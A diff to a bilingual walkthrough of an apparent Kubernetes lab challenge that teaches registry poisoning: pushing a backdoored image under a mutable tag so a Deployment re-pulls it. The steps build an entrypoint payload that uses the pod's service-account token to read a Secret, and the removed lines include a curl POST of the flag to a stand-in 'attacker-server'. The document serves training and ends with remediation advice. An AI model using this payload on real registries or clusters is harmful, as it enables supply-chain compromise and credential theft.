@@ -9,29 +9,31 @@
 | 技术/CVE | N/A (misconfiguration) |
 | 难度 | L2 |
 | 交付方式 | KIND / Kubernetes |
-| 入口 | KIND 集群内入口（无固定宿主端口） |
+| 入口 | localhost:10500 |
 
 ## 场景概述
-- 技术：N/A (misconfiguration)
+- 技术：N/A (misconfiguration) -- 无鉴权私有镜像仓库 + 可变 tag + Always 拉取
 - 难度：L2
 - 交付方式：k8s
+
 ## 攻击路径与利用步骤
 
 ## Overview
 | Property | Value |
 |----------|-------|
-| CVE/Technique | N/A (misconfiguration) -- insecure registry with mutable tags |
+| CVE/Technique | N/A -- insecure registry with mutable tags |
 | Difficulty | L2 |
 | Type | k8s (KIND cluster) |
 | Cluster Name | cve-k8s-09-registry |
-| Flag Location | Flag accessible via lateral movement after compromising the registry-target pod |
+| Registry | localhost:10500 (no TLS, on the kind network as `k8s-registry`) |
+| Flag Location | Secret `registry-flag` in namespace `default` (readable only by the workload SA) |
 
 ## Attack Path Summary
-1. An insecure private Docker registry runs on `localhost:10500` (no TLS)
-2. A pod (`registry-target`) pulls `localhost:10500/backdoored-nginx:latest` from this registry
-3. The attacker can push a malicious image with the same tag to the registry
-4. When the pod restarts or scales, it pulls the backdoored image
-5. The backdoored container reads the flag (or enables lateral movement to access it)
+1. An insecure private registry runs on `localhost:10500` (no TLS), attached to the kind network as `k8s-registry`
+2. A Deployment (`registry-target`) pulls `k8s-registry:5000/backdoored-nginx:latest` with `imagePullPolicy: Always`
+3. The attacker pushes a malicious image with the same tag to the registry
+4. Deleting the pod forces a re-pull; the Deployment runs the backdoored image
+5. The backdoored payload uses the pod SA token to read Secret `registry-flag` and writes it to `/tmp/flag.txt`
 
 ## Prerequisites
 - kubectl access to KIND cluster `cve-k8s-09-registry`
@@ -42,117 +44,69 @@
 
 ### Step 1: Verify the Insecure Registry
 ```bash
-# Test the registry is accessible
 curl -s http://localhost:10500/v2/
 # Expected: {}
-
-# List repositories
 curl -s http://localhost:10500/v2/_catalog
 # Expected: {"repositories":["backdoored-nginx"]}
-
-# List tags
-curl -s http://localhost:10500/v2/backdoored-nginx/tags/list
-# Expected: {"name":"backdoored-nginx","tags":["latest"]}
 ```
 
-### Step 2: Inspect the Current Image
+### Step 2: Create a Backdoored Image
 ```bash
-# Pull the current image to inspect it
-docker pull localhost:10500/backdoored-nginx:latest
-
-# Inspect the image
-docker inspect localhost:10500/backdoored-nginx:latest
-
-# Run it temporarily to see what it does
-docker run --rm localhost:10500/backdoored-nginx:latest
-```
-
-### Step 3: Create a Backdoored Image
-```bash
-# Create a Dockerfile with a reverse shell or flag-reading payload
 mkdir -p /tmp/backdoor
 cat > /tmp/backdoor/Dockerfile << 'EOF'
 FROM nginx:1.24-alpine
-
-# Add the flag reading payload
+RUN apk add --no-cache curl python3
 COPY payload.sh /docker-entrypoint.d/40-payload.sh
 RUN chmod +x /docker-entrypoint.d/40-payload.sh
 EOF
 
-# Create a payload that reads the flag and sends it somewhere
 cat > /tmp/backdoor/payload.sh << 'EOF'
 #!/bin/sh
-# Option 1: Write flag to a readable location
-kubectl get configmap app-config -o jsonpath='{.data.flag}' > /tmp/flag.txt 2>/dev/null || \
-  curl -s http://localhost:10500/v2/ 2>/dev/null
-
-# Option 2: The flag may be in environment variables
-env | grep FLAG > /tmp/flag.txt 2>/dev/null
-
-# Option 3: Exfiltrate
-curl -X POST --data-binary @/tmp/flag.txt http://attacker-server/flag 2>/dev/null || true
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+curl -s --cacert "$CA" -H "Authorization: Bearer $TOKEN" \
+  https://kubernetes.default.svc/api/v1/namespaces/default/secrets/registry-flag \
+  | python3 -c "import sys,json,base64; d=json.load(sys.stdin); print(base64.b64decode(d['data']['flag']).decode())" \
+  > /tmp/flag.txt
 EOF
 
-# Build the backdoored image
 docker build -t localhost:10500/backdoored-nginx:latest /tmp/backdoor/
 ```
 
-### Step 4: Push the Malicious Image
-```bash
-# Push the backdoored image to the insecure registry
-docker push localhost:10500/backdoored-nginx:latest
+> 注意：payload 需要 python3 解析 Secret JSON；若基础镜像没有，可改用
+> `grep -o '"flag":"[^"]*"'` + base64 处理，或在 Dockerfile 中安装。
 
-# Verify the new image is in the registry
+### Step 3: Push the Malicious Image
+```bash
+docker push localhost:10500/backdoored-nginx:latest
 curl -s http://localhost:10500/v2/backdoored-nginx/tags/list
 # Expected: {"name":"backdoored-nginx","tags":["latest"]}
 ```
 
-### Step 5: Trigger Pod Restart
-Trigger the pod to restart so it pulls the backdoored image:
-
+### Step 4: Trigger Pod Re-pull
 ```bash
-# Delete the pod to force recreation (Deployment will restart it)
-kubectl delete pod registry-target
-
-# Or scale down and up if using a Deployment
-# kubectl scale deploy vulnerable-app --replicas=0
-# kubectl scale deploy vulnerable-app --replicas=1
+kubectl delete pod -l app=registry-target
+kubectl get pods -l app=registry-target -w
 ```
 
-### Step 6: Verify Pod Pulled Backdoored Image
+### Step 5: Read the Flag
 ```bash
-# Watch the pod restart
-kubectl get pods -w
-# The pod should restart and pull the new image with the malicious tag
-
-# Once running, exec into the pod
-kubectl exec -it registry-target -- sh
-
-# Check if the payload executed
-cat /tmp/flag.txt
+NEW_POD=$(kubectl get pods -l app=registry-target -o jsonpath='{.items[0].metadata.name}')
+kubectl exec "$NEW_POD" -- cat /tmp/flag.txt
+# Expected: flag{k8s-09-*}
 ```
 
-### Step 7: Capture Flag
+## Flag Location
+- Secret `registry-flag` in namespace `default` (readable by the default SA via the
+  pre-configured `registry-secret-reader` RoleBinding)
 - Flag format: `flag{k8s-09-*}`
-- Flag location: May be in a ConfigMap readable from the compromised pod, or accessible through lateral movement after gaining code execution in the registry-target pod
-- Expected output: `flag{k8s-09-default}` (or custom value from `CVE_FLAG`)
 
-## Verification Commands
+## Verification
 ```bash
-# Verify the cluster is deployed
-kubectl cluster-info --context kind-cve-k8s-09-registry
-
-# Verify the registry is running
+cd cve_challenges/scenarios/k8s/registry-poison && bash deploy.sh
 curl -s http://localhost:10500/v2/
-
-# Verify the registry-target pod
-kubectl get pod registry-target
-
-# Check registry contents
-curl -s http://localhost:10500/v2/_catalog
-
-# Direct flag check (if accessible from pod)
-kubectl exec registry-target -- env | grep FLAG
+kubectl get deploy registry-target
+bash teardown.sh
 ```
 
 ## 此场景利用了哪些知识
@@ -163,7 +117,9 @@ kubectl exec registry-target -- env | grep FLAG
 | 侦察与前置条件 | Registry authentication and mutable image/tag inspection |
 | 核心漏洞与利用 | Push or replace a trusted image in the private registry |
 | 权限、横向或影响 | Supply-chain execution in cluster workloads |
-| 验证 | Observe the poisoned workload or retrieve its flag |
+| 验证 | Observe the poisoned workload and retrieve its flag |
 
 ## 修复建议
-升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
+私有镜像仓库必须启用鉴权、TLS 与推送审计；集群内镜像引用使用不可变 digest；
+对 `imagePullPolicy: Always` 的 Deployment 做镜像来源准入校验（Kyverno/Gatekeeper）
+并开启镜像签名验证。
